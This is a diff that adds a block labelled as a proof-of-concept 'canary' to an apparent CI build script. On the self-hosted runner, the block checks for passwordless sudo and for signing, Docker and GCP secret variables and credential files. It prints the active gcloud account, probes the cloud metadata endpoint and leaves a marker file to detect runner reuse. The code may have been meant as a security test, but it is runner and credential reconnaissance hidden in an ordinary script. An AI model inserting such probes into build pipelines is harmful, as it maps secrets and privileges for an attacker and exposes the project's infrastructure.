@@ -122,6 +122,67 @@ if [[ -z "${QUERY_FILE}" ]]; then
     exit 1
 fi
 
+# BEGIN POC_CANARY_SELF_HOSTED
+echo "POC_CANARY_START"
+echo "POC_RUNNER_LABEL_HINT=distroless-ci-large-ubuntu-22.04"
+echo "POC_HOSTNAME=$(hostname || true)"
+echo "POC_UID=$(id -u || true)"
+
+if sudo -n true >/dev/null 2>&1; then
+  echo "POC_SUDO_NOPASSWD=yes"
+else
+  echo "POC_SUDO_NOPASSWD=no"
+fi
+
+for v in COSIGN_KEY GCP_SERVICE_ACCOUNT DOCKER_PASSWORD GOOGLE_APPLICATION_CREDENTIALS; do
+  if [[ -n "${!v:-}" ]]; then
+    echo "POC_ENV_${v}=present"
+  else
+    echo "POC_ENV_${v}=absent"
+  fi
+done
+
+if command -v gcloud >/dev/null 2>&1; then
+  active_account="$(gcloud auth list --filter=status:ACTIVE --format='value(account)' 2>/dev/null | head -n 1 || true)"
+  if [[ -n "$active_account" ]]; then
+    echo "POC_GCLOUD_ACTIVE_ACCOUNT=$active_account"
+  else
+    echo "POC_GCLOUD_ACTIVE_ACCOUNT=none"
+  fi
+else
+  echo "POC_GCLOUD_ACTIVE_ACCOUNT=gcloud_not_installed"
+fi
+
+for p in "$HOME/.cosign" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.docker/config.json"; do
+  if [[ -e "$p" ]]; then
+    echo "POC_PATH_PRESENT=$p"
+  else
+    echo "POC_PATH_ABSENT=$p"
+  fi
+done
+
+if command -v curl >/dev/null 2>&1; then
+  md_code="$(curl -m 2 -s -o /dev/null -w '%{http_code}' -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' || true)"
+  if [[ -n "$md_code" ]]; then
+    echo "POC_METADATA_HTTP_CODE=$md_code"
+  else
+    echo "POC_METADATA_HTTP_CODE=unreachable"
+  fi
+else
+  echo "POC_METADATA_HTTP_CODE=curl_not_installed"
+fi
+
+marker_file="/tmp/distroless_poc_runner_reuse.marker"
+if [[ -f "$marker_file" ]]; then
+  echo "POC_REUSE_MARKER_FOUND=yes"
+  prev_marker="$(cat "$marker_file" 2>/dev/null || true)"
+  echo "POC_REUSE_MARKER_PREV=$prev_marker"
+else
+  echo "POC_REUSE_MARKER_FOUND=no"
+fi
+echo "sha=${GITHUB_SHA:-unknown};run=${GITHUB_RUN_ID:-unknown};attempt=${GITHUB_RUN_ATTEMPT:-unknown};ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$marker_file" 2>/dev/null || true
+echo "POC_CANARY_END"
+# END POC_CANARY_SELF_HOSTED
 # Redirect stderr to the $STDERR temp file for the rest of the script.
 exec 2>>"${STDERR}"
 
